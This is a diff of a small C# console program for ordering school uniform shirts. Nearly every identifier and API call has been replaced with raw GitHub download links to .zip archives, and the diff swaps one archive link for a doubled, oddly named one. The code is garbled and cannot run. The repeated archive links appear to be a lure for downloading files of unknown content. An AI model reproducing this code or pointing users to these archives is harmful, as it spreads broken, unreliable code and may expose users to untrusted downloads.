@@ -1,5 +1,5 @@
 # using System;
-using https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip;
+using https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip;
 
 class UniformShop
 {
@@ -14,7 +14,7 @@ class UniformShop
 
     public void Run()
     {
-        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("Welcome to the Uniform Shop!");
+        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Welcome to the Uniform Shop!");
 
         bool continueShopping = true;
 
@@ -23,12 +23,12 @@ class UniformShop
             DisplayShirtTypes();
             DisplaySizes();
 
-            int shirtTypeIndex = GetSelectedIndex("Enter the number corresponding to the shirt type: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip);
-            int sizeIndex = GetSelectedIndex("Enter the number corresponding to the size: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip);
+            int shirtTypeIndex = GetSelectedIndex("Enter the number corresponding to the shirt type: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip);
+            int sizeIndex = GetSelectedIndex("Enter the number corresponding to the size: ", https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip);
 
             if (shirtTypeIndex == -1 || sizeIndex == -1)
             {
-                https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("Invalid selection. Please try again.");
+                https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Invalid selection. Please try again.");
                 continue;
             }
 
@@ -38,40 +38,40 @@ class UniformShop
 
             Shirt shirt = new Shirt(selectedShirtType, selectedSize, price);
 
-            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip();
+            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip();
 
-            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("\nDo you want to place another order? (yes/no)");
-            string answer = https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip().ToLower();
+            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nDo you want to place another order? (yes/no)");
+            string answer = https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip().ToLower();
 
             if (answer != "yes")
                 continueShopping = false;
         }
 
-        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("\nThank you for shopping with us!");
+        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nThank you for shopping with us!");
     }
 
     private void DisplayShirtTypes()
     {
-        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("\nAvailable Shirt Types:");
-        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip; i++)
+        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("\nAvailable Shirt Types:");
+        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip; i++)
         {
-            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip($"{i + 1}. {shirtTypes[i]}");
+            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip($"{i + 1}. {shirtTypes[i]}");
         }
     }
 
     private void DisplaySizes()
     {
-        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip("Available Sizes:");
-        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip; i++)
+        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip("Available Sizes:");
+        for (int i = 0; i < https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip; i++)
         {
-            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip($"{i + 1}. {sizes[i]}");
+            https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip($"{i + 1}. {sizes[i]}");
         }
     }
 
     private int GetSelectedIndex(string prompt, int maxIndex)
     {  
-        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip(prompt);
-        if (https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip(https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/UNIFOR-SHO-METHOD-WIT-v1.4.zip(), out int selectedIndex) && selectedIndex >= 1 && selectedIndex <= maxIndex)
+        https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(prompt);
+        if (https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip SHOP WITH https://github.com/Gimmuel/UNIFORM-SHOP-WITH-METHOD/raw/refs/heads/master/UNIFORM SHOP WITH METHOD/WIT-METHOD-SHO-UNIFOR-myriotheism.zip(), out int selectedIndex) && selectedIndex >= 1 && selectedIndex <= maxIndex)
         {
             return selectedIndex - 1;
         }
